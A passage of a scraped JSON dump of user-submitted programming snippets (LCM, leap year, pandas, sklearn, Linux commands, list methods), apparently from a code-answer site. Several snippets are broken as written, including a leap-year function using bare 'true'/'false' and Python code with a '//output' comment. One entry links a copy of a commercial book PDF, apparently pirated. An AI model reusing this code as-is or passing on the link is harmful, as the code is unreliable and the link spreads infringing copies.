    "description": "import pywhatkit last_history_of_message_sent_by_python = pywhatkit.showHistory() print(last_history_of_message_sent_by_python)\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2235,
    "keyword": null,
    "link": null,
    "title": " lcm calculator",
    "description": "# I know you're a coder! So instead of using a calculator online,  #  you should make it on your own!   #Code:  def compute_lcm(x, y):     # choose the greater number    if x > y:        greater = x    else:        greater = y     while(True):        if((greater % x == 0) and (greater % y == 0)):            lcm = greater            break        greater += 1     return lcm  num1 = int(input('Number 1')) num2 = int(input('Number 2'))  print(\"The L.C.M. is\", compute_lcm(num1, num2))\n__code-examples__python__lcm_calculator__?\n# I know you're a coder! So instead of using a calculator online,  #  you should make it on your own!   #Code:  def compute_lcm(x, y):     # choose the greater number    if x > y:        greater = x    else:        greater = y     while(True):        if((greater % x == 0) and (greater % y == 0)):            lcm = greater            break        greater += 1     return lcm  num1 = int(input('Number 1')) num2 = int(input('Number 2'))  print(\"The L.C.M. is\", compute_lcm(num1, num2))\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2236,
    "keyword": null,
    "link": null,
    "title": " lcm math python library",
    "description": "from math import gcd def lcm(a,b):   return a*b/(gcd(a,b)) print(lcm(12,70)) //output: 420\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2237,
    "keyword": null,
    "link": null,
    "title": " lcm python",
    "description": "# Python program to find the L.C.M. of two input number  # This function computes GCD  def compute_gcd(x, y):     while(y):        x, y = y, x % y    return x  # This function computes LCM def compute_lcm(x, y):    lcm = (x*y)//compute_gcd(x,y)    return lcm  num1 = 54 num2 = 24   print(\"The L.C.M. is\", compute_lcm(num1, num2)) \nfrom math import gcd def lcm(a,b):   return a*b/(gcd(a,b)) print(lcm(12,70)) //output: 420\ndef find_lcm(x, y):     # choose the higher number    if x > y:        greater = x    else:        greater = y     while(True):        if((greater % x == 0) and (greater % y == 0)):            lcm = greater            break        greater += 1     return lcm  num1 = 22 # You can input the numbers if u want num2 = 56  # call the function print(\"L.C.M :\", find_lcm(num1, num2))\n# Python Program to find the L.C.M. of two input number #naive method def compute_lcm(x, y):     # choose the greater number    if x > y:        greater = x    else:        greater = y     while(True):        if((greater % x == 0) and (greater % y == 0)):            lcm = greater            break        greater += 1     return lcm  num1 = 54 num2 = 24  print(\"The L.C.M. is\", compute_lcm(num1, num2))\ndef lcm(a, b):         i = 1         if a > b:                 c = a                 d = b         else:                 c = b                 d = a         while True:                 if ((c * i) / d).is_integer():                         return c * i                 i += 1;\n",
    "reg_date": "2021-10-12T11:31:25.000Z"
  },
  {
    "id": 2238,
    "keyword": null,
    "link": null,
    "title": " lda scikit learn",
    "description": "import numpy as np from sklearn.discriminant_analysis import LinearDiscriminantAnalysis X = np.array([[-1, -1], [-2, -1], [-3, -2], [1, 1], [2, 1], [3, 2]]) y = np.array([1, 1, 1, 2, 2, 2]) clf = LinearDiscriminantAnalysis() clf.fit(X, y)  print(clf.predict([[-0.8, -1]]))\nfrom sklearn.discriminant_analysis import LinearDiscriminantAnalysis as LDA lda = LDA(n_components = 2) X_train = lda.fit_transform(X_train, y_train) X_test = lda.transform(X_test)\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2239,
    "keyword": null,
    "link": null,
    "title": " leanware forums",
    "description": "Leanware Forums are a great place to chat about hacking. https://leanware.ucyt.dev\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2240,
    "keyword": null,
    "link": null,
    "title": " leap year algorithm",
    "description": "def isLeapYear (year):     if ((year % 4 == 0) and (year % 100 != 0)) or (year % 400 == 0): \t\ttrue     else:     \tfalse\nif year % 4 == 0:   if year % 100 == 0:     if year % 400 == 0:       print(\"leap year\")     else:       print(\"not a leap year\")   else:     print(\"leap year\") else:   print(\"not a leap year\")\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2241,
    "keyword": null,
    "link": null,
    "title": " learn python the hard way pdf",
    "description": "'In Learn Python the Hard Way, Third Edition, you will learn Python  'by working through 52 brilliantly crafted exercises.   'You can download the pdf clicking the source link or using the 'following link:      https://drive.google.com/file/d/0B-hV1HrMP8j1OWpEWXBXbUJsNms/view\nThanks Bored Coder  It really works!!!\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2242,
    "keyword": null,
    "link": null,
    "title": " leduong django api",
    "description": "from time import time  from django.http import JsonResponse   def api_params(request):     ts = time()     if request.method == \"GET\":         try:             params = request.GET.dict()             results = JsonResponse({\"params\": list(params)})          except Exception as e:             results = JsonResponse({\"errors\": list(e)})     print('Took: ', time() - ts, 's')     return results \n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2243,
    "keyword": null,
    "link": null,
    "title": " left join outer apply",
    "description": "--Script #3 - OUTER APPLY and LEFT OUTER JOIN  SELECT * FROM Department D  OUTER APPLY     (     SELECT * FROM Employee E     WHERE E.DepartmentID = D.DepartmentID     ) A  GO   SELECT * FROM Department D  LEFT OUTER JOIN Employee E ON D.DepartmentID = E.DepartmentID  GO \n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2244,
    "keyword": null,
    "link": null,
    "title": " legend size matplotlib",
    "description": "plt.plot([1, 2, 3], label='Inline label') plt.legend(loc=1, prop={'size': 16})  \nimport numpy as np import matplotlib.pyplot as plt  x = np.linspace(0, 20, 1000) y1 = np.sin(x) y2 = np.cos(x)  plt.plot(x, y1, \"-b\", label=\"sine\") plt.plot(x, y2, \"-r\", label=\"cosine\") plt.legend(loc=\"upper left\") plt.ylim(-1.5, 2.0) plt.show()\nax.plot(randn(1000).cumsum(), 'k.', label='_nolegend_') \n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2245,
    "keyword": null,
    "link": null,
    "title": " les diviseurs d'un nombre python",
    "description": "# This function returns a list containing all the factors of a ginven parameters n def getFactors(n):     # Create an empty list for factors     factors=[];      # Loop over all factors     for i in range(1, n + 1):         if n % i == 0:             factors.append(i)      # Return the list of factors     return factors  # Call the function with a given value print (getFactors(256))\n#obtenir tous les diviseurs d'un nombre 'n' divisor = [d for d in range(1,n+1) if n%d==0]\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2246,
    "keyword": null,
    "link": null,
    "title": " les hommes y ont des loisirs lesquels",
    "description": "import\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2247,
    "keyword": null,
    "link": null,
    "title": " les librairies python a maitriser pour faire du machine learning",
    "description": "1- Pandas 2 - Numpy 3 - Scikit Learn 4 - Matpolib 5 - Seaborn 6 -Statsmodels 7 - Keras 8 - NetworkX 9 - BeautifulSoup 10 - NLTK (Text_mining)\n",
    "reg_date": "2021-10-12T11:31:26.000Z"
  },
  {
    "id": 2248,
    "keyword": null,
    "link": null,
    "title": " libGLU.so.1: cannot open shared object file: No such file or directory",
    "description": "sudo apt-get install libglu1\n1- Remove yay by running $ sudo pacman -R yay  2- Make a new directory and change to it (makes for easier cleanup):  $ mkdir /tmp/yay && cd /tmp/yay  3- Download the latest PKGBUILD for yay by running  $ curl -OJ 'https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h=yay'  4- Build and install the package by running  $ makepkg -si  5- Get rid of of the evidence:  $ rm -rf /tmp/yay\nsudo apt-get update && sudo apt-get install espeak \nsudo apt-get install libasound2 \nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/lib64/\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda-9.0/lib64/\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2249,
    "keyword": null,
    "link": null,
    "title": " libreoffice add line in table",
    "description": "1- Put the mouse cursor on the LAST column of the LAST row; 2- Press TAB;  # This will create a new line at the end of your table\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2250,
    "keyword": null,
    "link": null,
    "title": " libreoffice add row at the end of table",
    "description": "1- Put the mouse cursor on the LAST column of the LAST row; 2- Press TAB;  # This will create a new line at the end of your table\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2251,
    "keyword": null,
    "link": null,
    "title": " likeliness python",
    "description": "def similar(w1, w2):     w1 = w1 + ' ' * (len(w2) - len(w1))     w2 = w2 + ' ' * (len(w1) - len(w2))     return sum(1 if i == j else 0 for i, j in zip(w1, w2)) / float(len(w1)) \nfrom difflib import SequenceMatcher  def similar(a, b):     return SequenceMatcher(None, a, b).ratio() \n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2252,
    "keyword": null,
    "link": null,
    "title": " limit axis matplotlib",
    "description": "axes.set_xlim([xmin, xmax]) axes.set_ylim([ymin, ymax])\nplt.xlim(0, 100)\naxes = plt.gca() axes.set_xlim([xmin,xmax]) axes.set_ylim([ymin,ymax])\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2253,
    "keyword": null,
    "link": null,
    "title": " linear search in python",
    "description": "def linearsearch(arr, x):    for i in range(len(arr)):       if arr[i] == x:          return i    return -1 arr = [1,2,3,4,5,6,7,8] x = 4 print(\"element found at index \"+str(linearsearch(arr,x)))\ndef linear_search(a, key): \tposition = 0 \tflag = False \twhile position < len(a) and not flag: \t\tif a[position] == key: \t\t\tflag = True \t\telse: \t\t\tposition = position + 1 \treturn flag\ndef linear_search(myList,item):     for i in range(len(myList)):         if myList[i]==item:             return i     return -1  myList = [1,7,6,5,8] print(\"Element in List :\", myList) x = int(input(\"enter searching element :\"))  result = linear_search(myList,x) if result==-1:      print(\"Element not found in the list\") else:      print( \"Element \" + str(x) + \" is found at position %d\" %(result))  \n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2254,
    "keyword": null,
    "link": null,
    "title": " linux ubuntu install python 3.7",
    "description": "sudo apt-get install python3.7\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2255,
    "keyword": null,
    "link": null,
    "title": " linux uninstall python",
    "description": "# Remove python2 sudo apt purge -y python2.7-minimal  # You already have Python3 but  # don't care about the version  sudo ln -s /usr/bin/python3 /usr/bin/python  # Same for pip sudo apt install -y python3-pip sudo ln -s /usr/bin/pip3 /usr/bin/pip  # Confirm the new version of Python: 3 python --version\nsudo apt autoremove python\nsudo apt autoremove python3\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2256,
    "keyword": null,
    "link": null,
    "title": " list(set()) python remove order",
    "description": ">>> x = [1, 2, 20, 6, 210] >>> sorted(set(x), key=x.index) [1, 2, 20, 6, 210] \n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2257,
    "keyword": null,
    "link": null,
    "title": " list all installed python modules",
    "description": "pip list\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2258,
    "keyword": null,
    "link": null,
    "title": " list all virtualenv in python",
    "description": "$ lsvirtualenv -l \nlsvirtualenv\n",
    "reg_date": "2021-10-12T11:31:27.000Z"
  },
  {
    "id": 2259,
    "keyword": null,
    "link": null,
    "title": " list comp loop through list certain amount of times",
    "description": "data_subset = [car_data[i] for i in range(1000)] #List comp, that loops through a certain list (car_data) #in range of a 1000 times\n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2260,
    "keyword": null,
    "link": null,
    "title": " list count frequency python",
    "description": "import collections a = [1,1,1,1,2,2,2,2,3,3,4,5,5] counter=collections.Counter(a) print(counter) # Counter({1: 4, 2: 4, 3: 2, 5: 2, 4: 1}) print(counter.values()) # [4, 4, 2, 1, 2] print(counter.keys()) # [1, 2, 3, 4, 5] print(counter.most_common(3)) # [(1, 4), (2, 4), (3, 2)]\n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2261,
    "keyword": null,
    "link": null,
    "title": " list files in directory python",
    "description": "import os  files = os.listdir('.') print(files) for file in files:   # do something   \nimport os  my_list = os.listdir('My_directory')\nfrom shutil import copyfile copyfile(src, dst)\nimport os print(os.listdir('/path/to/folder/to/list'))\nfrom os import listdir from os.path import isfile, join onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]\nimport os def fn():       # 1.Get file names from directory     file_list=os.listdir(r\"C:\\Users\")     print (file_list)   #2.To rename files fn()\n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2262,
    "keyword": null,
    "link": null,
    "title": " list hackerrank solution",
    "description": "list=[] n=int(input()) for i in range(n):       p=input().split()     if p[0]==\"insert\":         list.insert(int(p[1]),int(p[2]))     elif p[0]==\"print\":         print(list)          elif (p[0]==\"remove\"):         list.remove(int(p[1]))     elif p[0]==\"append\":         list.append(int(p[1]))     elif p[0]==\"sort\":         list.sort()     elif p[0]==\"print\":         print(list)     elif p[0]==\"pop\":         list.pop()     elif p[0]==\"reverse\":         list.reverse()     elif p[0]==\"print\":         print(list)             \n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2263,
    "keyword": null,
    "link": null,
    "title": " list installed packages python",
    "description": "pip list\npip list [options] \npipenv lock -r\n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2264,
    "keyword": null,
    "link": null,
    "title": " list is subset of another list",
    "description": "one = [1, 2, 3] two = [9, 8, 5, 3, 2, 1]  all(x in two for x in one) \n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2265,
    "keyword": null,
    "link": null,
    "title": " list map lambda python",
    "description": "li = [5, 7, 22, 97, 54, 62, 77, 23, 73, 61]   final_list = list(map(lambda x: x*2, li)) print(final_list)\n# Map function   nums1 = [2,3,5,6,76,4,3,2] sq = list(map(lambda a : a*a, nums1)) print(sq)\n#Reduce function  from functools import reduce list2 =[1,2,3,4,5] fins = reduce(lambda x,y:x+y, list2) print(fins)  #o/p : 15   # reduce similar to this concept list2 =[1,2,3,4,5] adds = 0 for i in list2:     adds+=i print(adds) \n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2266,
    "keyword": null,
    "link": null,
    "title": " list mean python",
    "description": "# Example to find average of list number_list = [45, 34, 10, 36, 12, 6, 80] avg = sum(number_list)/len(number_list) print(\"The average is \", round(avg,2)) \nimport numpy as np np.mean(list) np.std(list)\n# Python program to get average of a list  def Average(lst):  \treturn sum(lst) / len(lst)   # Driver Code  lst = [15, 9, 55, 41, 35, 20, 62, 49]  average = Average(lst)   # Printing average of the list  print(\"Average of the list =\", round(average, 2))   # Output: # Average of the list = 35.75\nlist = [15, 18, 2, 36, 12, 78, 5, 6, 9]  # for older versions of python average_method_one = sum(list) / len(list)  # for python 2 convert len to a float to get float division average_method_two = sum(list) / float(len(list))  # round answers using round() or ceil() print(average_method_one) print(average_method_two)\nl = [15, 18, 2, 36, 12, 78, 5, 6, 9]  # By using the built-in statistics library import statistics statistics.mean(l)  # 20.11111111111111  # By defining a custom function def average(my_list):   return sum(my_list) / len(my_list) average(l) # 20.11111111111111\n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2267,
    "keyword": null,
    "link": null,
    "title": " list methods python",
    "description": "list.append(x) # append x to end of list list.extend(iterable) # append all elements of iterable to list list.insert(i, x) # insert x at index i list.remove(x) # remove first occurance of x from list list.pop([i]) # pop element at index i (defaults to end of list) list.clear() # delete all elements from the list list.index(x[, start[, end]]) # return index of element x list.count(x) # return number of occurances of x in list list.reverse() # reverse elements of list in-place (no return) list.sort(key=None, reverse=False) # sort list in-place list.copy() # return a shallow copy of the list\nlist.append() list.clear() list.copy()\t list.count() list.extend() list.index()      list.insert()\t list.pop()\t list.remove()\t list.reverse()\t list.append()\t list.clear()\t list.copy()\t list.count()\t list.extend()\t list.index()\t list.insert()\t list.pop()\t list.remove()\t list.reverse()\t list.sort()\t sorted(list)    \nmy_list = [\"banana\", \"cherry\", \"apple\"]  # len() : get the number of elements in a list print(\"Length:\", len(my_list))  # append() : adds an element to the end of the list my_list.append(\"orange\")  # insert() : adds an element at the specified position my_list.insert(1, \"blueberry\") print(my_list)  # pop() : removes and returns the item at the given position, default is the last item item = my_list.pop() print(\"Popped item: \", item)  # remove() : removes an item from the list my_list.remove(\"cherry\") # Value error if not in the list print(my_list)  # clear() : removes all items from the list my_list.clear() print(my_list)  # reverse() : reverse the items my_list = [\"banana\", \"cherry\", \"apple\"] my_list.reverse() print('Reversed: ', my_list)  # sort() : sort items in ascending order my_list.sort() print('Sorted: ', my_list)  # use sorted() to get a new list, and leave the original unaffected. # sorted() works on any iterable type, not just lists my_list = [\"banana\", \"cherry\", \"apple\"] new_list = sorted(my_list)  # create list with repeated elements list_with_zeros = [0] * 5 print(list_with_zeros)  # concatenation list_concat = list_with_zeros + my_list print(list_concat)  # convert string to list string_to_list = list('Hello') print(string_to_list) \n# Method\tDescription # append()\tAdds an element at the end of the list # clear()\tRemoves all the elements from the list # copy()\tReturns a copy of the list # count()\tReturns the number of elements with the specified value # extend()\tAdd the elements of a list (or any iterable), to the end of the current list # index()\tReturns the index of the first element with the specified value # insert()\tAdds an element at the specified position # pop()\tRemoves the element at the specified position # remove()\tRemoves the first item with the specified value # reverse()\tReverses the order of the list # sort()\tSorts the list # Note: Python does not have built-in support for Arrays, but Py# Method\tDescription # append()\tAdds an element at the end of the list # clear()\tRemoves all the elements from the list # copy()\tReturns a copy of the list # count()\tReturns the number of elements with the specified value # extend()\tAdd the elements of a list (or any iterable), to the end of the current list # index()\tReturns the index of the first element with the specified value # insert()\tAdds an element at the specified position # pop()\tRemoves the element at the specified position # remove()\tRemoves the first item with the specified value # reverse()\tReverses the order of the list # sort()\tSorts the list\n# empty list print(list())  # vowel string vowel_string = 'aeiou' print(list(vowel_string))  # vowel tuple vowel_tuple = ('a', 'e', 'i', 'o', 'u') print(list(vowel_tuple))  # vowel list vowel_list = ['a', 'e', 'i', 'o', 'u'] print(list(vowel_list))\n>>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana'] >>> fruits.count('apple') 2 >>> fruits.count('tangerine') 0 >>> fruits.index('banana') 3 >>> fruits.index('banana', 4)  # Find next banana starting a position 4 6 >>> fruits.reverse() >>> fruits ['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange'] >>> fruits.append('grape') >>> fruits ['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape'] >>> fruits.sort() >>> fruits ['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear'] >>> fruits.pop() 'pear' \n",
    "reg_date": "2021-10-12T11:31:28.000Z"
  },
  {
    "id": 2268,
    "keyword": null,
    "link": null,
    "title": " list of files in python",
    "description": "import os def fn():       # 1.Get file names from directory     file_list=os.listdir(r\"C:\\Users\")     print (file_list)   #2.To rename files fn()\nimport os  def get_filepaths(directory):     \"\"\"     This function will generate the file names in a directory      tree by walking the tree either top-down or bottom-up. For each      directory in the tree rooted at directory top (including top itself),      it yields a 3-tuple (dirpath, dirnames, filenames).     \"\"\"     file_paths = []  # List which will store all of the full filepaths.      # Walk the tree.     for root, directories, files in os.walk(directory):         for filename in files:             # Join the two strings in order to form the full filepath.             filepath = os.path.join(root, filename)             file_paths.append(filepath)  # Add it to the list.      return file_paths  # Self-explanatory.  # Run the above function and store its results in a variable.    full_file_paths = get_filepaths(\"/Users/johnny/Desktop/TEST\")\nPython By Charming Caribou on Mar 26 2020 import os  def get_filepaths(directory):     \"\"\"     This function will generate the file names in a directory      tree by walking the tree either top-down or bottom-up. For each      directory in the tree rooted at directory top (including top itself),      it yields a 3-tuple (dirpath, dirnames, filenames).     \"\"\"     file_paths = []  # List which will store all of the full filepaths.      # Walk the tree.     for root, directories, files in os.walk(directory):         for filename in files:             # Join the two strings in order to form the full filepath.             filepath = os.path.join(root, filename)             file_paths.append(filepath)  # Add it to the list.      return file_paths  # Self-explanatory.  # Run the above function and store its results in a variable.    full_file_paths = get_filepaths(\"/Users/johnny/Desktop/TEST\")\nimport glob files=glob.glob(given_path)\n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2269,
    "keyword": null,
    "link": null,
    "title": " list of python packages",
    "description": "pip list\npip list [options] \n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2270,
    "keyword": null,
    "link": null,
    "title": " list python processes",
    "description": "ps -ef | grep python\n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2271,
    "keyword": null,
    "link": null,
    "title": " list python processes linux terminal",
    "description": "ps -ef | grep python\n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2272,
    "keyword": null,
    "link": null,
    "title": " list to text file python",
    "description": "# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem)\nwith open('your_file.txt', 'w') as f:     for item in my_list:         f.write(\"%s\\n\" % item) \n# attempt #1 f = open(\"Bills.txt\", \"w\") f.write(\"\\n\".join(map(lambda x: str(x), bill_List))) f.close()   # attempt #2 # Open a file in write mode f = open('Bills.txt', 'w') for item in bill_List: f.write(\"%s\\n\" % item) # Close opend file f.close()  # attempt #3  with open('Bills.txt', 'w') as f: for s in bill_List:     f.write(s + '\\n')  with open('Bills.txt', 'r') as f: bill_List = [line.rstrip('\\n') for line in f]  # attempt #4 with open('Bills.txt', 'w') as out_file: out_file.write('\\n'.join(     bill_List)) \n# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem) \na_list = [\"abc\", \"def\", \"ghi\"] f = open(\"a_file.txt\", \"w\") for item in a_list:    f.write(item + \"\\n\") f.close()\n#Salvar lista em .txt with open('your_file.txt', 'w') as f:     for item in my_list:         f.write(\"%s\\n\" % item) \n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2273,
    "keyword": null,
    "link": null,
    "title": " load dataset X = pd.DataFrame(data.data, columns=data.features)",
    "description": "from sklearn.datasets import load_iris import pandas as pd  data = load_iris() df = pd.DataFrame(data.data, columns=data.feature_names) df.head()\n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2274,
    "keyword": null,
    "link": null,
    "title": " load diamonds dataset from sns",
    "description": "import seaborn as sns  df = sns.load_dataset('diamonds')\n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2275,
    "keyword": null,
    "link": null,
    "title": " load images pygame",
    "description": "import pygame from pygame.locals import* img = pygame.image.load('clouds.bmp')  white = (255, 64, 64) w = 640 h = 480 screen = pygame.display.set_mode((w, h)) screen.fill((white)) running = 1  while running:     screen.fill((white))     screen.blit(img,(0,0))     pygame.display.flip() \n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2276,
    "keyword": null,
    "link": null,
    "title": " load model keras",
    "description": "from tensorflow import keras model = keras.models.load_model('path/to/location')\n# Save the modelmodel.save('path_to_my_model.h5')# Recreate the exact same model purely from the filenew_model = keras.models.load_model('path_to_my_model.h5')\nmodel = load_model(path,custom_objects={\"weighted_loss\":weighted_loss})\n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2277,
    "keyword": null,
    "link": null,
    "title": " load model tensorflow",
    "description": "model = tf.keras.models.load_model('PATH')\nnew_model = tf.keras.models.load_model('my_model.h5')\n  with tf.Session() as sess:   new_saver = tf.train.import_meta_graph('my_test_model-1000.meta')   new_saver.restore(sess, tf.train.latest_checkpoint('./')) \n  with tf.Session() as sess:         saver = tf.train.import_meta_graph('my-model-1000.meta')     saver.restore(sess,tf.train.latest_checkpoint('./'))     print(sess.run('w1:0')) ##Model has been restored. Above statement will print the saved value of w1. \n",
    "reg_date": "2021-10-12T11:31:29.000Z"
  },
  {
    "id": 2278,
    "keyword": null,
    "link": null,
    "title": " load pandas from text",
    "description": "df = pd.read_csv('output_list.txt', sep=\" \", header=None) # or df = pd.read_fwf('output_list.txt')\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2279,
    "keyword": null,
    "link": null,
    "title": " loading animation python",
    "description": "import itertools import threading import time import sys  done = False #here is the animation def animate():     for c in itertools.cycle(['|', '/', '-', '\\\\']):         if done:             break         sys.stdout.write('\\rloading ' + c)         sys.stdout.flush()         time.sleep(0.1)     sys.stdout.write('\\rDone!     ')  t = threading.Thread(target=animate) t.start()  #long process here time.sleep(10) done = True\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2280,
    "keyword": null,
    "link": null,
    "title": " loca value and drop pandas dataframe",
    "description": "import pandas as pd  a = ['2015-01-01' , '2015-02-01']  df = pd.DataFrame(data={'date':['2015-01-01' , '2015-02-01', '2015-03-01' , '2015-04-01', '2015-05-01' , '2015-06-01']})  print(df) #         date #0  2015-01-01 #1  2015-02-01 #2  2015-03-01 #3  2015-04-01 #4  2015-05-01 #5  2015-06-01  df = df[~df['date'].isin(a)]  print(df) #         date #2  2015-03-01 #3  2015-04-01 #4  2015-05-01 #5  2015-06-01\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2281,
    "keyword": null,
    "link": null,
    "title": " local image embed discord py",
    "description": "embed = discord.Embed(title=\"Title\", description=\"Desc\", color=0x00ff00) #creates embed file = discord.File(\"path/to/image/file.png\", filename=\"image.png\") embed.set_image(url=\"attachment://image.png\") await ctx.send(file=file, embed=embed) \n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2282,
    "keyword": null,
    "link": null,
    "title": " local testing server Python",
    "description": "# If Python version returned above is 3.X python3 -m http.server # On windows try \"python\" instead of \"python3\", or \"py -3\" # If Python version returned above is 2.X python -m SimpleHTTPServer\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2283,
    "keyword": null,
    "link": null,
    "title": " lofi hip hop radio online",
    "description": "Lemme guess, you gotta code? LOL.\nStudy :(\nprint(\"Chill only :>\")\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2284,
    "keyword": null,
    "link": null,
    "title": " logging in with selenium",
    "description": "driver.get (&ldquo;URL&rdquo;) driver.find_element_by_id(&ldquo;ID&rdquo;).send_keys(&ldquo;username&rdquo;) driver.find_element_by_id (&ldquo;ID&rdquo;).send_keys(&ldquo;password&rdquo;) driver.find_element_by_id(&ldquo;submit&rdquo;).click()\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2285,
    "keyword": null,
    "link": null,
    "title": " login() got an unexpected keyword argument 'template name' django",
    "description": "url(r'^$', LoginView.as_view(template_name='landing.html'), name='landing')\n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2286,
    "keyword": null,
    "link": null,
    "title": " login page tkinter",
    "description": "  # define login function def login():          login_screen = Toplevel(main_screen)     login_screen.title(\"Login\")     login_screen.geometry(\"300x250\")     Label(login_screen, text=\"Please enter details below to login\").pack()     Label(login_screen, text=\"\").pack()       global username_verify     global password_verify       username_verify = StringVar()     password_verify = StringVar()           Label(login_screen, text=\"Username * \").pack()     username_login_entry = Entry(login_screen, textvariable=username_verify)     username_login_entry.pack()     Label(login_screen, text=\"\").pack()     Label(login_screen, text=\"Password * \").pack()     password__login_entry = Entry(login_screen, textvariable=password_verify, show= '*')     password__login_entry.pack()     Label(login_screen, text=\"\").pack()     Button(login_screen, text=\"Login\", width=10, height=1, command=login_verification).pack()   \n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2287,
    "keyword": null,
    "link": null,
    "title": " logistic regression algorithm in python",
    "description": "# import the class from sklearn.linear_model import LogisticRegression  # instantiate the model (using the default parameters) logreg = LogisticRegression()  # fit the model with data logreg.fit(X_train,y_train)  # y_pred=logreg.predict(X_test) \nprint(\"Accuracy:\",metrics.accuracy_score(y_test, y_pred)) print(\"Precision:\",metrics.precision_score(y_test, y_pred)) print(\"Recall:\",metrics.recall_score(y_test, y_pred)) \nsklearn.linear_model.LogisticRegression\n# import the metrics class from sklearn import metrics cnf_matrix = metrics.confusion_matrix(y_test, y_pred) cnf_matrix \n",
    "reg_date": "2021-10-12T11:31:30.000Z"
  },
  {
    "id": 2288,
    "keyword": null,
    "link": null,
    "title": " logistic regression sklearn",
    "description": "#Logistic Regression Model  from sklearn.linear_model import LogisticRegression LR = LogisticRegression(random_state=0).fit(X, y) LR.predict(X[:2, :]) #Return the predictions LR.score(X, y) #Return the mean accuracy on the given test data and labels  #Regression Metrics #Mean Absolute Error  from sklearn.metrics import mean_absolute_error  mean_absolute_error(y_true, y_pred)  #Mean Squared Error  from sklearn.metrics import mean_squared_error mean_squared_error(y_true, p_pred)  #R2 Score  from sklearn.metrics import r2_score r2_score(y_true, y_pred)\n# import the class from sklearn.linear_model import LogisticRegression  # instantiate the model (using the default parameters) logreg = LogisticRegression()  # fit the model with data logreg.fit(X_train,y_train)  # y_pred=logreg.predict(X_test) \nmodel1 = LogisticRegression(random_state=0, multi_class='multinomial', penalty='none', solver='newton-cg').fit(X_train, y_train) preds = model1.predict(X_test)  #print the tunable parameters (They were not tuned in this example, everything kept as default) params = model1.get_params() print(params)  {'C': 1.0, 'class_weight': None, 'dual': False, 'fit_intercept': True, 'intercept_scaling': 1, 'l1_ratio': None, 'max_iter': 100, 'multi_class': 'multinomial', 'n_jobs': None, 'penalty': 'none', 'random_state': 0, 'solver': 'newton-cg', 'tol': 0.0001, 'verbose': 0, 'warm_start': 